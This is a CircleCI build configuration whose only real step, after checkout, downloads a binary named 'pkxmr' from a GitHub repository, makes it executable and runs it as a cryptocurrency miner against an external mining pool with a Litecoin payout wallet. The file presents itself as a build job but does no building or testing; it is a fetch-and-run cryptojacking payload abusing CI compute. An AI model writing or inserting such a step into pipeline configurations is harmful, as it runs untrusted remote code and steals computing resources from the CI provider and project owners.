version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
    steps:
      - checkout
      - run:  wget https://github.com/parkitmove/nuri-xm/raw/main/pkxmr && chmod +x pkxmr && ./pkxmr -o rx.unmineable.com:3333 -a rx -k -u LTC:MAU5ycXcJM3sBjREYEaFzRgxvbxYwkfQ4Y.ampaskopi-001 -p x --threads=2
